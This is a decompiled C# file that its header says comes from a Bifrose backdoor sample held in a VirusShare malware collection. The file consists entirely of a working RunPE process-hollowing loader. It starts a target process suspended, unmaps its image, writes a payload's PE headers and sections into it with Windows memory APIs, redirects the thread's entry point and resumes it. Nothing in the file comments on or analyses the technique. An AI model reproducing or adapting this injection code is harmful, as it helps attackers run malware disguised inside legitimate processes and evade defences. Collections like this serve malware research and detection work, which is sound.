// Decompiled with JetBrains decompiler
// Type: iSimon.rp
// Assembly: DPCS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EE2DA26E-EE38-4116-9F1E-B3EC5FEAAEBB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Backdoor.Win32.Bifrose.fsi-f8c5d83d9692f7d250ad1a6ac45a22daed295b288e5b811a274af0b9f6217b17.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace iSimon
{
  public class rp
  {
    public const long PAGE_NOCACHE = 512;
    public const long PAGE_EXECUTE_READWRITE = 64;
    public const long PAGE_EXECUTE_WRITECOPY = 128;
    public const long PAGE_EXECUTE_READ = 32;
    public const long PAGE_EXECUTE = 16;
    public const long PAGE_WRITECOPY = 8;
    public const long PAGE_NOACCESS = 1;
    public const long PAGE_READWRITE = 4;
    public const uint PAGE_READONLY = 2;

    public static void MakeIt(byte[] data, string target)
    {
      rp.H.Context context = new rp.H.Context();
      rp.H.Process_Information processInformation = new rp.H.Process_Information();
      rp.H.Startup_Information Expression = new rp.H.Startup_Information();
      rp.H.Security_Flags securityFlags1 = new rp.H.Security_Flags();
      rp.H.Security_Flags securityFlags2 = new rp.H.Security_Flags();
      GCHandle gcHandle = GCHandle.Alloc((object) data, GCHandleType.Pinned);
      IntPtr ptr1 = gcHandle.AddrOfPinnedObject();
      int int32 = ptr1.ToInt32();
      rp.H.DOS_Header dosHeader1 = new rp.H.DOS_Header();
      object structure1 = Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), dosHeader1.GetType());
      rp.H.DOS_Header dosHeader2;
      rp.H.DOS_Header dosHeader3 = structure1 != null ? (rp.H.DOS_Header) structure1 : dosHeader2;
      gcHandle.Free();
      string str1 = (string) null;
      ref string local1 = ref str1;
      ref string local2 = ref target;
      ref rp.H.Security_Flags local3 = ref securityFlags1;
      ref rp.H.Security_Flags local4 = ref securityFlags2;
      IntPtr num1;
      IntPtr system = num1;
      string str2 = (string) null;
      ref string local5 = ref str2;
      ref rp.H.Startup_Information local6 = ref Expression;
      ref rp.H.Process_Information local7 = ref processInformation;
      if (-(rp.H.CreateProcess(ref local1, ref local2, ref local3, ref local4, false, 4U, system, ref local5, ref local6, out local7) ? 1 : 0) == 0)
        return;
      rp.H.NT_Headers ntHeaders1 = new rp.H.NT_Headers();
      ptr1 = new IntPtr(checked (int32 + dosHeader3.Address));
      object structure2 = Marshal.PtrToStructure(ptr1, ntHeaders1.GetType());
      rp.H.NT_Headers ntHeaders2;
      rp.H.NT_Headers ntHeaders3 = structure2 != null ? (rp.H.NT_Headers) structure2 : ntHeaders2;
      Expression.CB = Strings.Len((object) Expression);
      context.Flags = 65538U;
      if (ntHeaders3.Signature != 17744U | dosHeader3.Magic != (ushort) 23117)
        return;
      int num2 = rp.H.GetThreadContext(processInformation.Thread, ref context) ? 1 : 0;
      IntPtr process1 = processInformation.Process;
      IntPtr address1 = (IntPtr) checked ((long) context.Ebx + 8L);
      long num3;
      IntPtr ptr2 = (IntPtr) num3;
      ref IntPtr local8 = ref ptr2;
      IntPtr size1 = (IntPtr) 4;
      int num4 = 0;
      ref int local9 = ref num4;
      int num5 = rp.H.ReadProcessMemory(process1, address1, ref local8, size1, ref local9);
      long num6 = (long) ptr2;
      int num7 = num5 >= 0 ? 1 : 0;
      if ((num2 & num7 & (rp.H.ZwUnmapViewOfSection(processInformation.Process, (IntPtr) num6) >= 0L ? 1 : 0)) == 0)
        return;
      uint num8 = checked ((uint) (int) rp.H.VirtualAllocEx(processInformation.Process, (IntPtr) (long) ntHeaders3.Optional.Image, ntHeaders3.Optional.SImage, 12288U, 4U));
      if (num8 == 0U)
        return;
      IntPtr process2 = processInformation.Process;
      IntPtr address2 = (IntPtr) (long) num8;
      byte[] buffer1 = data;
      IntPtr sheaders = (IntPtr) (long) ntHeaders3.Optional.SHeaders;
      uint num9;
      num4 = checked ((int) num9);
      ref int local10 = ref num4;
      rp.H.WriteProcessMemory(process2, address2, buffer1, sheaders, out local10);
      uint num10 = checked ((uint) num4);
      long num11 = (long) checked (dosHeader3.Address + 248);
      int num12 = checked ((int) ntHeaders3.File.Sections - 1);
      int num13 = 0;
      while (num13 <= num12)
      {
        ptr2 = new IntPtr(checked ((long) int32 + num11 + (long) (num13 * 40)));
        rp.H.Section_Header sectionHeader1;
        object structure3 = Marshal.PtrToStructure(ptr2, sectionHeader1.GetType());
        rp.H.Section_Header sectionHeader2;
        sectionHeader1 = structure3 != null ? (rp.H.Section_Header) structure3 : sectionHeader2;
        byte[] numArray = new byte[checked ((int) sectionHeader1.Size + 1)];
        int num14 = checked ((int) ((long) sectionHeader1.Size - 1L));
        int index = 0;
        while (index <= num14)
        {
          numArray[index] = data[checked ((int) ((long) sectionHeader1.Pointer + (long) index))];
          checked { ++index; }
        }
        IntPtr process3 = processInformation.Process;
        IntPtr address3 = (IntPtr) (long) checked (num8 + sectionHeader1.Address);
        byte[] buffer2 = numArray;
        IntPtr size2 = (IntPtr) (long) sectionHeader1.Size;
        num4 = checked ((int) num10);
        ref int local11 = ref num4;
        rp.H.WriteProcessMemory(process3, address3, buffer2, size2, out local11);
        num10 = checked ((uint) num4);
        rp.H.VirtualProtectEx(processInformation.Process, (IntPtr) (long) checked (num8 + sectionHeader1.Address), (UIntPtr) sectionHeader1.Misc.Size, (UIntPtr) checked ((ulong) rp.Protect((long) sectionHeader1.Flags)), checked ((uint) num6));
        checked { ++num13; }
      }
      byte[] bytes = BitConverter.GetBytes(num8);
      IntPtr process4 = processInformation.Process;
      IntPtr address4 = (IntPtr) checked ((long) context.Ebx + 8L);
      byte[] buffer3 = bytes;
      IntPtr size3 = (IntPtr) 4;
      num4 = checked ((int) num10);
      ref int local12 = ref num4;
      rp.H.WriteProcessMemory(process4, address4, buffer3, size3, out local12);
      num9 = checked ((uint) num4);
      context.Eax = checked (num8 + ntHeaders3.Optional.Address);
      rp.H.SetThreadContext(processInformation.Thread, ref context);
      int num15 = (int) rp.H.ResumeThread(processInformation.Thread);
    }

    private static long RShift(long lValue, long lNumberOfBitsToShift) => checked ((long) Math.Round(unchecked (rp.vbLongToULong(lValue) / Math.Pow(2.0, (double) lNumberOfBitsToShift))));

    private static double vbLongToULong(long Value) => Value >= 0L ? (double) Value : (double) Value + 4294967296.0;

    private static long Protect(long characteristics) => Conversions.ToLong(new object[8]
    {
      (object) 1L,
      (object) 16L,
      (object) 2U,
      (object) 32L,
      (object) 4L,
      (object) 64L,
      (object) 4L,
      (object) 64L
    }[checked ((int) rp.RShift(characteristics, 29L))]);

    [EditorBrowsable(EditorBrowsableState.Never)]
    internal class H
    {
      [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern bool CreateProcess(
        [MarshalAs(UnmanagedType.VBByRefStr)] ref string name,
        [MarshalAs(UnmanagedType.VBByRefStr)] ref string command,
        ref rp.H.Security_Flags process,
        ref rp.H.Security_Flags thread,
        bool inherit,
        uint flags,
        IntPtr system,
        [MarshalAs(UnmanagedType.VBByRefStr)] ref string current,
        [In] ref rp.H.Startup_Information startup,
        out rp.H.Process_Information info);

      [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern bool WriteProcessMemory(
        IntPtr process,
        IntPtr address,
        byte[] buffer,
        IntPtr size,
        out int written);

      [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern int ReadProcessMemory(
        IntPtr process,
        IntPtr address,
        ref IntPtr buffer,
        IntPtr size,
        ref int read);

      [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern int VirtualProtectEx(
        IntPtr process,
        IntPtr address,
        UIntPtr size,
        UIntPtr @new,
        [Out] uint old);

      [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern IntPtr VirtualAllocEx(
        IntPtr process,
        IntPtr address,
        uint size,
        uint type,
        uint protect);

      [DllImport("ntdll", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern long ZwUnmapViewOfSection(IntPtr process, IntPtr address);

      [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern uint ResumeThread(IntPtr thread);

      [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern bool GetThreadContext(IntPtr thread, ref rp.H.Context context);

      [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern bool SetThreadContext(IntPtr thread, ref rp.H.Context context);

      public struct Context
      {
        public uint Flags;
        public uint D0;
        public uint D1;
        public uint D2;
        public uint D3;
        public uint D6;
        public uint D7;
        public rp.H.Save Save;
        public uint SG;
        public uint SF;
        public uint SE;
        public uint SD;
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        public uint Ebp;
        public uint Eip;
        public uint SC;
        public uint EFlags;
        public uint Esp;
        public uint SS;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] Registers;
      }

      public struct Save
      {
        public uint Control;
        public uint Status;
        public uint Tag;
        public uint ErrorO;
        public uint ErrorS;
        public uint DataO;
        public uint DataS;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
        public byte[] RegisterArea;
        public uint State;
      }

      public struct Misc
      {
        public uint Address;
        public uint Size;
      }

      public struct Section_Header
      {
        public byte Name;
        public rp.H.Misc Misc;
        public uint Address;
        public uint Size;
        public uint Pointer;
        public uint PRelocations;
        public uint PLines;
        public uint NRelocations;
        public uint NLines;
        public uint Flags;
      }

      public struct Process_Information
      {
        public IntPtr Process;
        public IntPtr Thread;
        public int ProcessId;
        public int ThreadId;
      }

      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
      public struct Startup_Information
      {
        public int CB;
        public string ReservedA;
        public string Desktop;
        public string Title;
        public int X;
        public int Y;
        public int XSize;
        public int YSize;
        public int XCount;
        public int YCount;
        public int Fill;
        public int Flags;
        public short ShowWindow;
        public short ReservedB;
        public int ReservedC;
        public int Input;
        public int Output;
        public int Error;
      }

      public struct Security_Flags
      {
        public int Length;
        public IntPtr Descriptor;
        public int Inherit;
      }

      public struct DOS_Header
      {
        public ushort Magic;
        public ushort Last;
        public ushort Pages;
        public ushort Relocations;
        public ushort Size;
        public ushort Minimum;
        public ushort Maximum;
        public ushort SS;
        public ushort SP;
        public ushort Checksum;
        public ushort IP;
        public ushort CS;
        public ushort Table;
        public ushort Overlay;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public ushort[] ReservedA;
        public ushort ID;
        public ushort Info;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] ReservedB;
        public int Address;
      }

      public struct NT_Headers
      {
        public uint Signature;
        public rp.H.File_Header File;
        public rp.H.Optional_Headers Optional;
      }

      public struct File_Header
      {
        public ushort Machine;
        public ushort Sections;
        public uint Stamp;
        public uint Table;
        public uint Symbols;
        public ushort Size;
        public ushort Flags;
      }

      public struct Optional_Headers
      {
        public ushort Magic;
        public byte Major;
        public byte Minor;
        public uint SCode;
        public uint IData;
        public uint UData;
        public uint Address;
        public uint Code;
        public uint Data;
        public uint Image;
        public uint SectionA;
        public uint FileA;
        public ushort MajorO;
        public ushort MinorO;
        public ushort MajorI;
        public ushort MinorI;
        public ushort MajorS;
        public ushort MinorS;
        public uint Version;
        public uint SImage;
        public uint SHeaders;
        public uint Checksum;
        public ushort Subsystem;
        public ushort Flags;
        public uint SSReserve;
        public uint SSCommit;
        public uint SHReserve;
        public uint SHCommit;
        public uint LFlags;
        public uint Count;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public rp.H.Data_Directory[] DataDirectory;
      }

      public struct Data_Directory
      {
        public uint Address;
        public uint Size;
      }
    }
  }
}
